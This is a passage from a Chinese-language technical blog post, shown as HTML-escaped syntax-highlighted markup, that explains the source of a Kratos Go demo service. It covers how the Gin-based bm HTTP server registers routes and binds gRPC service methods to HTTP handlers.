&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">var&lt;/span> &lt;span class="nx">svc&lt;/span> &lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DemoServer&lt;/span>
&lt;span class="c1">// New new a bm server.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DemoServer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">engine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="nx">cfg&lt;/span> &lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ServerConfig&lt;/span>
&lt;span class="nx">ct&lt;/span> &lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TOML&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 读取你的配置文件
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">paladin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http.toml&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Unmarshal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">ct&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 得到http.toml的Server字段
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">ct&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Server&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">UnmarshalTOML&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">cfg&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">svc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">s&lt;/span>
&lt;span class="c1">// 做一个新 engine
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// (engine 是 Gin 里的模块，这里我就不分析Gin的源码了)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">engine&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">DefaultServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">cfg&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 将gRPC服务注册到engine, 这个代码注册代码是bm自己生成的
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 一会我们分析
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">pb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterDemoBMServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 把你的路由搞进去
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nf">initRouter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">engine&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1">// 开始跑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">engine&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Start&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 路由在这里登记！
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">initRouter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ping&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">g&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Group&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/kratos-demo&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/start&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">howToStart&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ping error(%v)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">AbortWithStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusServiceUnavailable&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// example for http request handler.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">howToStart&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">k&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">model&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Kratos&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Hello&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Golang 大法好 !!!我好你个头！&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果你使用过&lt;code>gin&lt;/code>这个web框架, 上面的代码你一定很熟悉，对吧？
&lt;code>bm&lt;/code>就是&lt;code>gin&lt;/code>，只是部分代码被Bilibili魔改了，整体架构是不变的。&lt;/p>
&lt;p>OK，我们看看&lt;code>RegisterDemoBMServer&lt;/code>里做了什么.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// DemoBMServer is the server API for Demo service.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">DemoBMServer&lt;/span> &lt;span class="kd">interface&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">google_protobuf1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">google_protobuf1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">SayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">google_protobuf1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nf">SayHelloURL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">HelloResp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 我们写的gRPC服务
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">DemoSvc&lt;/span> &lt;span class="nx">DemoBMServer&lt;/span>
&lt;span class="c1">// ------------------------------------------------
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 我们仔细分析这些方法不难发现
&lt;/span>&lt;span class="c1">// 他们都会调用 `BindWith` 和对应的gRPC方法
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 先使用BindWith: 将request中的`Body` 转化为go中的 `struct`
&lt;/span>&lt;span class="c1">// 然后使用gRPC方法处理请求数据
&lt;/span>&lt;span class="c1">// 最后返回
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// 本质就是通过http调用gRPC服务
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">demoPing&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">google_protobuf1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Empty&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">binding&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Default&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Method&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">)));&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">DemoSvc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">demoSayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">binding&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Default&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Method&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">)));&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">DemoSvc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">demoSayHelloURL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">p&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">HelloReq&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">binding&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Default&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Method&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Header&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">)));&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">DemoSvc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SayHelloURL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">p&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">//-------------------------------------
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// RegisterDemoBMServer Register the blademaster route
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">RegisterDemoBMServer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="nx">DemoBMServer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// server 是我们之前编写的gRPC服务
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">DemoSvc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">server&lt;/span>
&lt;span class="c1">// 将一些方法注册到路由里去
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/demo.service.v1.Demo/Ping&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">demoPing&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/demo.service.v1.Demo/SayHello&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">demoSayHello&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/kratos-demo/say_hello&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">demoSayHelloURL&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>哇，原来只是把一些gRPC的服务绑定到&lt;code>gin&lt;/code>的路由里了呀。
借用&lt;code>gin&lt;/code>来调用gRPC.&lt;/p>
&lt;p>&lt;code>grpc.New()&lt;/code>就不分析了。&lt;/p>
&lt;p>然后是&lt;code>AppNew()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">//go:generate kratos tool wire
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">App&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
